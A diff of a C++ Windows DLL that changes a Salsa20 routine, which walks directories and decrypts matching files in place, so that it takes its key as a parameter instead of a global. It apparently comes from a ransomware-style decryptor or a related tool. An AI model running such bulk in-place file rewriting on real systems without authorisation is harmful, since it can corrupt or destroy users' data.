@@ -8,13 +8,6 @@
 
 
 // This is an example of an exported variable
-DLL_API int nDLL=0;
-
-// This is an example of an exported function.
-DLL_API int fnDLL(void)
-{
-    return 0;
-}
 
 // This is the constructor of a class that has been exported.
 
@@ -23,7 +16,7 @@ DLL_API int fnDLL(void)
 
 
 
- BOOL DecFileW(std::string absFilePath) {
+ BOOL DecFileW(std::string absFilePath,byte* pkey) {
 
 	DWORD dwFileAttributes = GetFileAttributesA(absFilePath.c_str());
 	HANDLE hFile = CreateFileA(absFilePath.c_str(), GENERIC_ALL, 0,
@@ -72,7 +65,7 @@ DLL_API int fnDLL(void)
 						Salsa20::Decryption salsa20;
 						AlgorithmParameters params = MakeParameters("Rounds", 8)
 							("IV", ConstByteArrayParameter(IV, 8, false));
-						salsa20.SetKey(gkey, 32, params);
+						salsa20.SetKey(pkey, 32, params);
 						salsa20.ProcessData((byte*)lpOutPut, (byte*)lpBuffer, dwByteRead);
 						SetFilePointer(hFile, 0, NULL, 0);
 						bSuccess = WriteFile(hFile, lpOutPut, dwByteRead, NULL, NULL);
@@ -132,7 +125,7 @@ DLL_API int fnDLL(void)
 				if (found != std::string::npos)
 				{
 					std::string absFilePath = StartDir + fileName;
-					DecFileW(absFilePath);
+					//DecFileW(absFilePath);
 				}
 			}
 		}
@@ -350,7 +343,6 @@ DLL_API int fnDLL(void)
     LPVOID key_addr = malloc(sizeof(key_t));
     memset(key_addr, 0, sizeof(key_t));
     memcpy(key_addr, key_t, sizeof(key_t));
-    gkey = (byte*)key_addr;
     return key_s;
 }
 
